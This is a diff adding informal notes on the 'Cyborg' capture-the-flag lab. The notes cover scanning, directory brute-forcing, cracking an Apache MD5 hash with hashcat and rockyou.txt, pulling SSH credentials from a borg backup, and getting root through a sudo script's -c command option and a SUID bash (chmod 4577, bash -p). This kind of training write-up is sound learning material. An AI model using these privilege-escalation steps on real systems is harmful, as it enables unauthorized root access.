@@ -130,5 +130,58 @@ enumerate machine with NMAP  --> nmap -T5 -p- -sV -vv 10.10.100.67 -oA nmap
 	>cat root/root.txt----> get the flag
 
 ==============================================================================================================================
+Cyborg 
 
+	Nmap IP address
+	visit website, view page source, search for any info- no interesting information
+	Directory bruteforcing
+	Got admin panel, found Alex is user, enumerate more on the website, got clues like squidfroxy, music-archive
+	Download tar file t see whats inside
+	in readme file from downloaded tar  has URL
+	From dirbuster search found /amin and /etc folder
+	Navigate to /etc from browser, found squid (which has hashed password ) /passwd,
+	search $apr1$ in google- found like it  apache generated algorith password- MD5
+	use hashcat to decrypt
+	hashcat -h | grep apr1   --->  found that 1600
+	hashcat -a 0 -m 1600 hash rockyou.txt --force   (where has is hash value we found and stored with file name as hash)-- got password as "squidward"
+	Previously we gor URL from read me file, in that we have URL, navigate to that URL in browser
+	from above URL, we see some installation steps of borgbackup, follow installation step provided in installation tab
+	After installation , extract music-archive which e have unzipped earlier
+	from linux machine search , borg -h and man borg- > found usage syntax -> borg extract /path/to/repo/:password
+	>borg list /path/to/repo/:Music-archive-> found note.txt-> cat this file-> found Alex user credentials
+	ssh to alex@ipaddess   -> enter password when prompt for
+	After login found user.txt file which is a flag
+
+	next step is get root access
+	sudo -l  ( to find anything alex run with root privilizes) -> got /etc/mp3backups/backup.sh
+	cd to /etc/mp3backups and cat backup.sh
+	Found cmd=$command , c $command , we can execute command like >sudo backup.sh -c whoami -> shows as root
+	//To make privilize escLtion
+	>sudo backup.sh -c /bin/bash /   --> success of privilize escalation for /bin/bash
+	After privilize escalation check for whether we became root user?
+	>whoami  //not shown any output, may be working
+
+	Another way to see content of root.txt as follows
+	> cat root/root.txt /root/flag.txt   // to make loacl copy
+
+	create suid to execute as root user to see content of root.txt
+	>chmod 4577 /bin/bash     //giving root permission for /bin/bash to execute commands as root
+	exit from current directory enter >exit
+	
+	//switch to bash 
+	>bash -p   //bash interactive shell
+	>whoami   //output shown as root , so we are good to go for read root.txt
+
+	cd /etc/mp3backups
+	>ls
+
+	repeat agin
+	>chmod 4577 /bin/bash 
+	
+	>bash -p   //bash interactive shell
+	>whoami   //output shown as root , so we are good to go for read root.txt
+	
+	=====================================================================================
+	
+	
 
